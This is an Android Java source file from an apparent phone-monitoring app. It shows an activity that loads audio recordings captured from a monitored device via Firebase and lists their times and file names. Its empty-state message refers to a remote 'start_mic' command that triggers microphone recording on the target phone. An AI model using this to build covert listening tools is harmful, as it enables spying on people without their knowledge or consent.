package com.kidsguard.parent;

import android.app.Activity;
import android.os.Bundle;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;

import org.json.JSONObject;

import java.util.Iterator;

public class RecordingsActivity extends Activity {

    String deviceCode;
    LinearLayout layout;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        deviceCode = getIntent().getStringExtra("device_code");

        ScrollView scroll = new ScrollView(this);
        layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(40, 40, 40, 40);
        scroll.addView(layout);
        setContentView(scroll);
        setTitle("Audio Recordings");

        addLoadingText();
        loadRecordings();
    }

    private void addLoadingText() {
        TextView tv = new TextView(this);
        tv.setText("Loading recordings...");
        tv.setTextColor(0xFF888888);
        tv.setTextSize(14);
        layout.addView(tv);
    }

    private void loadRecordings() {
        new Thread(() -> {
            String json = FirebaseHelper.get("devices/" + deviceCode + "/recordings.json");

            runOnUiThread(() -> layout.removeAllViews());

            if (json != null && !json.equals("null") && !json.isEmpty()) {
                try {
                    JSONObject recs = new JSONObject(json);
                    Iterator<String> keys = recs.keys();
                    boolean hasRecordings = false;

                    while (keys.hasNext()) {
                        hasRecordings = true;
                        String key = keys.next();
                        try {
                            JSONObject rec = recs.getJSONObject(key);
                            String file = rec.optString("file", "");
                            String time = rec.optString("time", "");
                            runOnUiThread(() -> addRecording(file, time));
                        } catch (Exception e) {}
                    }

                    if (!hasRecordings) {
                        runOnUiThread(() -> addNoDataText());
                    }
                } catch (Exception e) {
                    runOnUiThread(() -> addErrorText("Failed to parse recordings"));
                }
            } else {
                runOnUiThread(() -> addNoDataText());
            }
        }).start();
    }

    private void addRecording(String file, String time) {
        TextView tv = new TextView(this);
        tv.setText("🎤 Recording at: " + time + "\n📁 File: " + file + "\n");
        tv.setTextSize(14);
        tv.setTextColor(0xFFFFFFFF);
        tv.setPadding(0, 10, 0, 10);
        layout.addView(tv);
    }

    private void addNoDataText() {
        TextView tv = new TextView(this);
        tv.setText("No recordings found.\nSend 'start_mic' command first.");
        tv.setTextColor(0xFF888888);
        tv.setTextSize(14);
        layout.addView(tv);
    }

    private void addErrorText(String msg) {
        TextView tv = new TextView(this);
        tv.setText("Error: " + msg);
        tv.setTextColor(0xFFFF4444);
        tv.setTextSize(14);
        layout.addView(tv);
    }
}
